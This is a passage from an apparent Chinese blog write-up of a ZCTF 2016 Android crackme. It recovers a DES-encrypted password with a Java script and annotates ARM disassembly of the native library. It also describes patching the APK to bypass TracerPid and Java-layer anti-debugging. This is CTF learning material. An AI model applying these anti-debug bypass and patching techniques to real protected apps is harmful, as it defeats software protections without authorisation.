		is.close();
	} catch (Exception e) {
		e.printStackTrace();
	}
	Cursor cursor = SQLiteDatabase.openOrCreateDatabase(DB_PATH + DB_NAME, null).rawQuery(getString(R.string.rawQuery), null);
	String strtest = &quot;abcdefgh&quot;;
	if (cursor.getCount() &amp;gt; 0) {
		cursor.moveToFirst();
		try {
			strtest = new String(cursor.getBlob(0), &quot;utf-8&quot;).trim();
		} catch (Exception e2) {
			e2.printStackTrace();
		}
	}
	cursor.close();
	return strtest;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;找到路径&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;string name=&quot;DB_NAME&quot;&amp;gt;key.db&amp;lt;/string&amp;gt;
&amp;lt;string name=&quot;DB_PATH&quot;&amp;gt;/data/data/com.zctf.app/databases/&amp;lt;/string&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;前面先将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key.db&lt;/code&gt;文件拷贝到目标路径，然后读取，读取的SQL语句如下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;string name=&quot;rawQuery&quot;&amp;gt;select key from key where id=0&amp;lt;/string&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;直接用工具读取出数据库的值&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/7A6AF384C17284B00FDD45822D7F1685.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;调用验证函数，先获取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username + password&lt;/code&gt;字符串逆序的字节数组，调用了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;encrypt()&lt;/code&gt;函数进行加密，然后读取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag_bin&lt;/code&gt;文件和加密后的数据进行对比&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public int auth(Context context, String input, String password1) {
	byte[] result = encrypt(new StringBuffer(input).reverse().toString().getBytes(), password1);
	try {
		InputStream is = context.getAssets().open(context.getString(R.string.flag_bin));
		byte[] buffer = new byte[64];
		do {
		} while (is.read(buffer) &amp;gt; 0);
		is.close();
		int i = 0;
		while (i &amp;lt; buffer.length &amp;amp;&amp;amp; i &amp;lt; result.length) {
			if (i &amp;lt; buffer.length &amp;amp;&amp;amp; i &amp;lt; result.length &amp;amp;&amp;amp; buffer[i] != result[i]) {
				return 0;
			}
			i++;
		}
	} catch (IOException e) {
		e.printStackTrace();
	}
	return 1;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这个加密函数使用了DES加密算法&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public static byte[] encrypt(byte[] datasource, String password) {
	try {
		SecureRandom random = new SecureRandom();
		SecretKey securekey = SecretKeyFactory.getInstance(&quot;DES&quot;).generateSecret(new DESKeySpec(password.getBytes()));
		Cipher cipher = Cipher.getInstance(&quot;DES&quot;);
		cipher.init(1, securekey, random);
		return cipher.doFinal(datasource);
	} catch (Throwable e) {
		e.printStackTrace();
		return null;
	}
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;那么我们可以直接读取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag_bin&lt;/code&gt;文件，使用秘钥&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zctf2016&lt;/code&gt;进行解密，从而查看密码是多少&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package com.wnagzihxain.demo;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import java.io.File;
import java.io.FileInputStream;
import java.security.SecureRandom;

public class Demo {

    public static void main(String[] args) throws Exception{
        FileInputStream fileInputStream = null;
        byte[] buffer = new byte[16];
        try {
            fileInputStream = new FileInputStream(new File(&quot;flag.bin&quot;));
            System.out.println(fileInputStream.available());
            do {
            } while (fileInputStream.read(buffer) &amp;gt; 0);
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                fileInputStream.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        StringBuilder stringBuilder = new StringBuilder(new String(decrypt(buffer, &quot;zctf2016&quot;))).reverse();
        System.out.println(stringBuilder);
    }

    public static byte[] decrypt(byte[] src, String password) throws Exception {
        SecureRandom random = new SecureRandom();
        SecretKey securekey = SecretKeyFactory.getInstance(&quot;DES&quot;).generateSecret(new DESKeySpec(password.getBytes()));
        Cipher cipher = Cipher.getInstance(&quot;DES&quot;);
        cipher.init(Cipher.DECRYPT_MODE, securekey, random);
        return cipher.doFinal(src);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;由于密文长度的问题，一共只有16字节，但是分配了64字节的空间，解密会报错，所以我手动改成了16，或者定义数组的时候使用读取的长度作为参数传进去&lt;/p&gt;

&lt;p&gt;输出&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zctf{Notthis}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;因吹斯听~~~&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/3CA10C7F1DA879758189755B0F31E105.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;喵喵喵~~~&lt;/p&gt;

&lt;p&gt;看来是要继续看代码&lt;/p&gt;

&lt;p&gt;我们发现它在校验完密码后，会跳转到另一个Activity，在经过分析后，这个Activity里的东西貌似才是关键&lt;/p&gt;

&lt;p&gt;横竖都退出，喵喵喵？&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public boolean CheckOperatorNameAndroid(Context context) throws InterruptedException {
	if (((TelephonyManager) context.getSystemService(&quot;phone&quot;)).getNetworkOperatorName().toLowerCase().equals(getString(R.string.android))) {
		Toast.makeText(getApplicationContext(), getString(R.string.detect_quit), 1).show();
		new Timer().schedule(this.task, 3500);
	} else {
		Toast.makeText(getApplicationContext(), getString(R.string.no_detect_quit), 1).show();
		new Timer().schedule(this.task, 3500);
	}
	return false;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;接下来是一个Native函数，目测是反调试&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (this.dataProvider.add(1, 2) == 1) {
	AlertDialog alertDialog = new Builder(this).create();
	alertDialog.setTitle(getString(R.string.alert_title));
	alertDialog.setMessage(getString(R.string.alert_contain));
	alertDialog.setButton(getString(R.string.alert_button), new OnClickListener() {
		public void onClick(DialogInterface dialog, int which) {
			System.exit(0);
		}
	});
	alertDialog.show();
	return;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;跟到so，符号都没混淆，程序猿编程习惯不错&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:00001AD8 ; int __fastcall Java_com_zctf_app_JNIclass_add(JNIEnv *a1)
.text:00001AD8 EXPORT Java_com_zctf_app_JNIclass_add
.text:00001AD8 Java_com_zctf_app_JNIclass_add
.text:00001AD8 PUSH    {R3,LR}
.text:00001ADA BL      AntiDebug_TracerPid
.text:00001ADE POP     {R3,PC}
.text:00001ADE ; End of function Java_com_zctf_app_JNIclass_add
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;大概是在进行TracerPid检测反调试&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/A1ECD94681C95DCFCE1604B8D9CE9FEC.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;再将一个文件读到目标文件夹下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public void pushthebottom() {
	String BM_PATH = getString(R.string.BM_PATH);
	String BM_NAME = getString(R.string.bottom);
	File f = new File(BM_PATH);
	if (!f.exists()) {
		f.mkdir();
	}
	try {
		InputStream is = getBaseContext().getAssets().open(BM_NAME);
		OutputStream os = new FileOutputStream(BM_PATH + BM_NAME);
		byte[] buffer = new byte[1024];
		while (true) {
			int length = is.read(buffer);
			if (length &amp;gt; 0) {
				os.write(buffer, 0, length);
			} else {
				os.flush();
				os.close();
				is.close();
				return;
			}
		}
	} catch (Exception e) {
		e.printStackTrace();
	}
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最后调用另一个Native函数进行处理，传入的是刚才计算出来的密码&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{Notthis}&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;this.tv.setText(this.dataProvider.sayHelloInc(passwd));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;该函数不复杂，简单看一下函数调用，目测是进行DES加解密的计算，入口处理了传入的密码，存储为字节数组&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:00001AE0 ; int __fastcall Java_com_zctf_app_JNIclass_sayHelloInc(JNIEnv *a1, int a2, int a3)
.text:00001AE0 EXPORT Java_com_zctf_app_JNIclass_sayHelloInc
.text:00001AE0 Java_com_zctf_app_JNIclass_sayHelloInc
.text:00001AE0
.text:00001AE0 src= -0x40
.text:00001AE0 var_3C= -0x3C
.text:00001AE0 var_38= -0x38
.text:00001AE0 var_34= -0x34
.text:00001AE0 var_2C= -0x2C
.text:00001AE0 var_1C= -0x1C
.text:00001AE0
.text:00001AE0 PUSH    {R4-R7,LR}
.text:00001AE2 LDR     R5, =(__stack_chk_guard_ptr - 0x1AEC)
.text:00001AE4 SUB     SP, SP, #0x2C
.text:00001AE6 ; 32:   v5 = (*a1)-&amp;gt;FindClass(a1, &quot;java/lang/String&quot;);
.text:00001AE6 LDR     R1, =(aJavaLangString - 0x1AF0)
.text:00001AE8 ADD     R5, PC ; __stack_chk_guard_ptr
.text:00001AEA LDR     R5, [R5] ; __stack_chk_guard
.text:00001AEC ADD     R1, PC          ; R1 = &quot;java/lang/String&quot;
.text:00001AEE ; 29:   v3 = a1;
.text:00001AEE MOVS    R4, R0          ; R4 = R0 = env
.text:00001AF0 ; 30:   v4 = (void *)a3;
.text:00001AF0 LDR     R3, [R5]        ; R3 = 栈保护
.text:00001AF2 MOVS    R6, R2          ; R6 = R2 = password
.text:00001AF4 ; 31:   v28 = _stack_chk_guard;
.text:00001AF4 STR     R3, [SP,#0x40+var_1C] ; 栈保护
.text:00001AF6 LDR     R3, [R0]        ; R3 = (*env)
.text:00001AF8 LDR     R3, [R3,#JNINativeInterface.FindClass] ; (*env)-&amp;gt;FindClass
.text:00001AFA BLX     R3              ; R0 = (*env)-&amp;gt;FindClass(env, &quot;java/lang/String&quot;)
.text:00001AFC ; 33:   v6 = (*v3)-&amp;gt;NewStringUTF(v3, &quot;GB2312&quot;);
.text:00001AFC LDR     R1, [R4]        ; R1 = (*env)
.text:00001AFE MOVS    R2, #JNINativeInterface.NewStringUTF ; R2 = 0x29C
.text:00001B02 LDR     R3, [R1,R2]     ; (*env)-&amp;gt;NewStringUTF
.text:00001B04 LDR     R1, =(aGb2312 - 0x1B0E)
.text:00001B06 MOVS    R7, R0          ; R7 = R0 = jclass_String
.text:00001B08 MOVS    R0, R4          ; R0 = R4 = env
.text:00001B0A ADD     R1, PC          ; R1 = &quot;GB2312&quot;
.text:00001B0C BLX     R3              ; R0 = (*env)-&amp;gt;NewStringUTF(env, &quot;GB2312&quot;);
.text:00001B0E ; 34:   v7 = (*v3)-&amp;gt;GetMethodID(v3, v5, &quot;getBytes&quot;, &quot;(Ljava/lang/String;)[B&quot;);
.text:00001B0E LDR     R3, [R4]        ; R3 = (*env)
.text:00001B10 LDR     R2, =(aGetbytes - 0x1B1E)
.text:00001B12 MOVS    R1, R7          ; R1 = R7 = jclass_String
.text:00001B14 ADDS    R3, #8
.text:00001B16 LDR     R3, [R3,#0x7C]  ; (*env)-&amp;gt;GetMethodID
.text:00001B18 STR     R0, [SP,#0x40+src] ; src = &quot;GB2312&quot;
.text:00001B1A ADD     R2, PC          ; R2 = &quot;getBytes&quot;
.text:00001B1C MOV     R12, R3         ; R3 = R12 = (*env)-&amp;gt;GetMethodID
.text:00001B1E LDR     R3, =(aLjavaLangStrin - 0x1B26)
.text:00001B20 MOVS    R0, R4          ; R0 = env
.text:00001B22 ADD     R3, PC          ; R3 = &quot;(Ljava/lang/String;)[B&quot;
.text:00001B24 BLX     R12             ; R0 = (*env)-&amp;gt;GetMethodID(env, jclass_String, &quot;getBytes&quot;, &quot;(Ljava/lang/String;)[B&quot;
.text:00001B26 ; 35:   v8 = (*v3)-&amp;gt;CallObjectMethod(v3, v4, v7, v6, v6);
.text:00001B26 LDR     R3, [R4]        ; R3 = (*env)
.text:00001B28 MOVS    R2, R0          ; R2 = R0 = jmethodID_getBytes
.text:00001B2A MOVS    R1, R6          ; R1 = R6 = password
.text:00001B2C ADDS    R3, #JNINativeInterface.CallObjectMethod ; R3 = p_(*env)-&amp;gt;CallObjectMethod
.text:00001B2E LDR     R7, [R3]        ; R7 = (*env)-&amp;gt;CallObjectMethod
.text:00001B30 MOVS    R0, R4          ; R0 = R4 = env
.text:00001B32 LDR     R3, [SP,#0x40+src] ; R3 = &quot;GB2312&quot;
.text:00001B34 BLX     R7              ; R0 = (*env)-&amp;gt;CallObjectMethod(env, password, jmethodID_getBytes, &quot;GB2312&quot;);
.text:00001B36 LDR     R1, [R4]        ; R1 = (*env)
.text:00001B38 MOVS    R3, #0xAB       ; R3 = 0xAB
.text:00001B3A MOVS    R7, R0          ; R7 = R0 = bytearray_password
.text:00001B3C ; 36:   v9 = (*v3)-&amp;gt;GetArrayLength(v3, v8);
.text:00001B3C LSLS    R3, R3, #2      ; R3 = 0xAB &amp;lt;&amp;lt; 2
.text:00001B3E LDR     R3, [R1,R3]     ; R3 = (*env)-&amp;gt;GetArrayLength
.text:00001B40 MOVS    R0, R4          ; R0 = R4 = env
.text:00001B42 MOVS    R1, R7          ; R0 = R7 = bytearray_password
.text:00001B44 BLX     R3              ; R0 = (*env)-&amp;gt;GetArrayLength(env, bytearray_password);
.text:00001B46 ; 37:   src = (*v3)-&amp;gt;GetByteArrayElements(v3, v8, 0);
.text:00001B46 LDR     R2, [R4]        ; R2 = (*env)
.text:00001B48 MOVS    R3, #JNINativeInterface.GetByteArrayElements ; R3 = p_(*env)-&amp;gt;GetByteArrayElements
.text:00001B4C LDR     R3, [R2,R3]     ; R3 = (*env)-&amp;gt;GetByteArrayElements
.text:00001B4E MOVS    R6, R0          ; R6 = R0 = 密码字节数组长度
.text:00001B50 MOVS    R1, R7          ; R1 = R7 = bytearray_password
.text:00001B52 MOVS    R0, R4          ; R0 = env
.text:00001B54 MOVS    R2, #0          ; R2 = 0
.text:00001B56 BLX     R3              ; R0 = (*env)-&amp;gt;GetByteArrayElements(env, bytearray_password, 0);
.text:00001B58 STR     R5, [SP,#0x40+var_34]
.text:00001B5A STR     R0, [SP,#0x40+src] ; src指向密码的byte数组
.text:00001B5C ; 38:   if ( v9 &amp;lt;= 0 )
.text:00001B5C CMP     R6, #0          ; 判断密码长度
.text:00001B5E BLE     loc_1B76
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;申请堆空间，将前面获取的密码字节数组存储到堆中&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:00001B60 ; 44:     v10 = j_j_malloc(v9 + 1);
.text:00001B60 ADDS    R0, R6, #1      ; R0 = len + 1
.text:00001B62 BL      j_j_malloc      ; R0 = malloc(len + 1)
.text:00001B66 ; 45:     j_j_memcpy(v10, src, v9);
.text:00001B66 LDR     R1, [SP,#0x40+src] ; src
.text:00001B68 MOVS    R2, R6          ; n
.text:00001B6A MOVS    R5, R0          ; R5 = R0 = 新申请的堆空间
.text:00001B6C BL      j_j_memcpy      ; memcpy(R0, src, len)
.text:00001B70 ; 46:     *((_BYTE *)v10 + v9) = 0;
.text:00001B70 MOVS    R3, #0          ; R3 = 0
.text:00001B72 STRB    R3, [R5,R6]     ; heap_passwd[len] = 0
.text:00001B74 B       loc_1B78
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;释放掉临时密码数组的内存，同时再次调用TracerPid检测反调试函数&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:00001B78 loc_1B78                ;
.text:00001B78 LDR     R1, [R4]        ; R1 = (*env)
.text:00001B7A MOVS    R3, #JNINativeInterface.ReleaseByteArrayElements
.text:00001B7E LDR     R6, [R1,R3]     ; R6 = (*env)-&amp;gt;ReleaseByteArrayElements
.text:00001B80 MOVS    R0, R4          ; R0 = R4 = env
.text:00001B82 MOVS    R1, R7          ; R1 = R7 = bytearray_password
.text:00001B84 LDR     R2, [SP,#0x40+src] ; R2 = src
.text:00001B86 MOVS    R3, #0          ; R3 = 0
.text:00001B88 BLX     R6              ; R0 = (*env)-&amp;gt;ReleaseByteArrayElements(env, bytearray_password, src, 0);
.text:00001B8A ; 49:   if ( AntiDebug_TracerPid() )
.text:00001B8A BL      AntiDebug_TracerPid ; R0 = AntiDebug_TracerPid()
.text:00001B8E STR     R0, [SP,#0x40+src] ; src = 反调试结果
.text:00001B90 CMP     R0, #0
.text:00001B92 BEQ     loc_1BA4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这log输出的是啥玩意？？？，后面申请了一个比较大的堆空间&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:00001BA4 ; 57:     j_j___android_log_print(4, &quot;System.out&quot;, &quot;銈傘亞銇欍亾銇椼€€闋戝嫉銇ｃ仸&quot;);
.text:00001BA4
.text:00001BA4 loc_1BA4
.text:00001BA4 LDR     R2, =(aSystem_out - 0x1BAC)
.text:00001BA6 MOVS    R0, #4          ; R0 = 4
.text:00001BA8 ADD     R2, PC          ; R2 = &quot;System.out&quot;
.text:00001BAA MOVS    R1, R2          ; R1 = R2 = &quot;System.out&quot;
.text:00001BAC STR     R2, [SP,#0x40+var_3C] ; var_3C = &quot;System.out&quot;
.text:00001BAE LDR     R2, =(aUvvubjubsubuub - 0x1BB4)
.text:00001BB0 ADD     R2, PC          ; &quot;銈傘亞銇欍亾銇椼€€闋戝嫉銇ｃ仸&quot;
.text:00001BB2 BL      j_j___android_log_print
.text:00001BB6 ; 58:     v14 = j_j_malloc(0x1460u);
.text:00001BB6 MOVS    R0, #0x1460     ; R0 = 0x1460
.text:00001BBA BL      j_j_malloc      ; R0 = malloc(0x1460)
.text:00001BBE ; 59:     v15 = (int)v14;
.text:00001BBE SUBS    R6, R0, #0      ; 判断堆空间是否申请成功
.text:00001BC0 ; 60:     if ( v14 )
.text:00001BC0 BEQ     loc_1C5E
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;申请堆空间成功后，进行堆的初始化，拷贝了一个256字节的Table过去，同时打开文件&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/data/data/com.zctf.app/files/bottom&lt;/code&gt;，这个文件在Java层做了拷贝操作&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:00001BC2 ; 62:       j_j_memset(v14, 0, 0x1460u);
.text:00001BC2 MOVS    R2, #0xA3       ; R2 = 0xA3
.text:00001BC4 LDR     R1, [SP,#0x40+src] ; R1 = 0 //借用反调试结果，为0才能走到该分支
.text:00001BC6 LSLS    R2, R2, #5      ; R2 = 0x1460
.text:00001BC8 BL      j_j_memset      ; R0 = memset(申请的堆空间, 0, 0x1460)
.text:00001BCC ; 63:       j_j_memcpy((void *)v15, &amp;amp;top, 0x100u);
.text:00001BCC LDR     R1, =(top_ptr - 0x1BD6)
.text:00001BCE MOVS    R2, #0x100      ; n
.text:00001BD2 ADD     R1, PC ; top_ptr
.text:00001BD4 LDR     R1, [R1] ; top  ; src
.text:00001BD6 MOVS    R0, R6          ; R6 = R0 = 堆空间
.text:00001BD8 BL      j_j_memcpy      ; R0 = memcpy(堆空间, top, 0x100)
.text:00001BDC ; 64:       v16 = j_j_fopen(&quot;/data/data/com.zctf.app/files/bottom&quot;, &quot;rb&quot;);
.text:00001BDC LDR     R0, =(aDataDataCom_zc - 0x1BE4)
.text:00001BDE LDR     R1, =(aRb - 0x1BE6)
.text:00001BE0 ADD     R0, PC          ; &quot;/data/data/com.zctf.app/files/bottom&quot;
.text:00001BE2 ADD     R1, PC          ; &quot;rb&quot;
.text:00001BE4 BL      j_j_fopen       ; R0 = fopen(&quot;/data/data/com.zctf.app/files/bottom&quot;, &quot;rb&quot;)
.text:00001BE8 ; 65:       v17 = v16;
.text:00001BE8 SUBS    R7, R0, #0      ; R7 = R0 //判断读取的数据是否成功
.text:00001BEA ; 66:       if ( v16 )
.text:00001BEA BNE     loc_1BF6
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在做完准备工作后，进行DES解密，密文前256字节存储在so中，秘钥是传入的密码前8字节&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:00001BF6 loc_1BF6                ;
.text:00001BF6 ADDS    R0, R6, #1      ; R0 = R6 + 1 = 申请堆空间偏移1
.text:00001BF8 MOVS    R2, #0x9B       ; R2 = 0x9B
.text:00001BFA MOVS    R3, R7          ; R3 = R7 = stream
.text:00001BFC MOVS    R1, #1          ; R1 = 1
.text:00001BFE LSLS    R2, R2, #5      ; R2 = 0x1360
.text:00001C00 ADDS    R0, #0xFF       ; R0 = 堆空间地址 + 256 = ptr
.text:00001C02 BL      j_j_fread       ; R0 = fread((byte *)堆地址 + 256, 1, 0x1360, stream)
.text:00001C06 STR     R0, [SP,#0x40+var_38] ; var_38 = R0 = 读取的字节数
.text:00001C08 ; 69:         j_j_fclose(v17);
.text:00001C08 MOVS    R0, R7          ; stream
.text:00001C0A ADD     R7, SP, #0x40+var_2C
.text:00001C0C BL      j_j_fclose      ; close(stream)
.text:00001C10 ; 70:         j_j_memset(&amp;amp;v26, 0, 0x10u);
.text:00001C10 LDR     R1, [SP,#0x40+src] ; R1 = 0
.text:00001C12 MOVS    R2, #0x10       ; R2 = 0x10
.text:00001C14 MOVS    R0, R7          ; R0 = var_2C
.text:00001C16 BL      j_j_memset      ; memset(var_2C, 0, 0x10)
.text:00001C1A ; 71:         v21 = *(_DWORD *)v10;
.text:00001C1A LDR     R3, [R5]        ; R3 = heap_passwd[0]
.text:00001C1C ; 72:         v22 = *((_DWORD *)v10 + 1);
.text:00001C1C LDR     R5, [R5,#4]     ; R5 = heap_passwd[1]
.text:00001C1E ; 73:         v26 = v21;
.text:00001C1E MOVS    R0, #0xA3       ; R0 = 0xA3
.text:00001C20 STR     R3, [SP,#0x40+var_2C] ; var_2C = heap_passwd[0]
.text:00001C22 ; 74:         v27 = v22;
.text:00001C22 LSLS    R0, R0, #5      ; R0 = 0x1460
.text:00001C24 STR     R5, [R7,#4]     ; var_2C+4 = heap_passwd[1]
.text:00001C26 ; 75:         v23 = j_j_malloc(0x1460u);
.text:00001C26 BL      j_j_malloc      ; R0 = malloc(0x1460)
.text:00001C2A MOVS    R2, #0xA3       ; R2 = 0xA3
.text:00001C2C LDR     R1, [SP,#0x40+src] ; R1 = 0
.text:00001C2E LSLS    R2, R2, #5      ; R2 = 0x1460
.text:00001C30 MOVS    R5, R0          ; R0 = R5 = 另一个堆空间
.text:00001C32 ; 76:         j_j_memset(v23, 0, 0x1460u);
.text:00001C32 BL      j_j_memset      ; R0 = memset(另一个堆空间, 0, 0x1460)
.text:00001C36 ; 77:         DES_Decrypt(v15, v20 + 256, &amp;amp;v26, v23);
.text:00001C36 LDR     R1, [SP,#0x40+var_38] ; R1 = 前面读取bottom文件的字节数
.text:00001C38 MOVS    R2, R7          ; R2 = R7 = heap_passwd
.text:00001C3A MOVS    R3, R5          ; R3 = R5 = 堆2首地址
.text:00001C3C ADDS    R1, #1          ; R1 = bottom文件字节数 + 1
.text:00001C3E ADDS    R1, #0xFF       ; R1 = 256
.text:00001C40 MOVS    R0, R6          ; R0 = R6 = 堆1首地址
.text:00001C42 BL      DES_Decrypt
.text:00001C46 ; 78:         j_j_free((void *)v15);
.text:00001C46 MOVS    R0, R6          ; ptr
.text:00001C48 BL      j_j_free        ; 释放堆1
.text:00001C4C ; 79:         j_j_free(v23);
.text:00001C4C MOVS    R0, R5          ; ptr
.text:00001C4E BL      j_j_free        ; 释放堆2
.text:00001C52 ; 80:         v18 = &quot;System.out&quot;;
.text:00001C52 LDR     R2, =(aTooLateBoy - 0x1C5C)
.text:00001C54 LDR     R1, [SP,#0x40+var_3C]
.text:00001C56 ; 81:         v19 = &quot;Too late, Boy&quot;;
.text:00001C56 MOVS    R0, #4
.text:00001C58 ADD     R2, PC          ; &quot;Too late, Boy&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里提供两种方法查看解密后的数据&lt;/p&gt;

&lt;p&gt;第一种是手动模拟计算&lt;/p&gt;

&lt;p&gt;以为接下来我会撸一波代码秀一波加解密吗？&lt;/p&gt;

&lt;p&gt;呵呵，我是那种喜欢撸代码的人吗？&lt;/p&gt;

&lt;p&gt;其实我开始用C撸了一遍解密，然而写挫了，解密的数据有点小问题&lt;/p&gt;

&lt;p&gt;直接进入第二种方法，我们可以发现解密完后的数据直接就释放掉了，也就是说，内存中有那么一瞬间存在着解密后的数据&lt;/p&gt;

&lt;p&gt;所以，可以通过动态调试，把那片内存撸出来，同时为了可以动态调试，我们需要先过掉反调试&lt;/p&gt;

&lt;p&gt;也就是要修改APK，改的方法有很多，组合也非常多种，比我晚上撸串的选择都多&lt;/p&gt;

&lt;p&gt;这里提供一种我个人的方案&lt;/p&gt;

&lt;p&gt;以修改最少为原则，删删删这种方法我不是很喜欢&lt;/p&gt;

&lt;p&gt;退出函数把退出的那句代码删掉&lt;/p&gt;

&lt;p&gt;下面TracerPid反调试的代码这里不修改，我们可以修改检测函数的返回值，而不是在调用的时候改&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if-ne v4, v6, :cond_1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这样Java层的反调试就绕过了，如果跑起来，效果大概是这样的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/49ED1D549D6976A0834978A681FA997E.png&quot; alt=&quot;4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;原因我们在前面的代码中分析过，解密后的堆数据直接就释放了&lt;/p&gt;

&lt;p&gt;侧面说明，解密后的数据是一张图片&lt;/p&gt;

&lt;p&gt;接下来修改Native层，这里需要额外多注意一点，这个so有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNI_OnLoad&lt;/code&gt;函数&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:00001D28                             EXPORT JNI_OnLoad
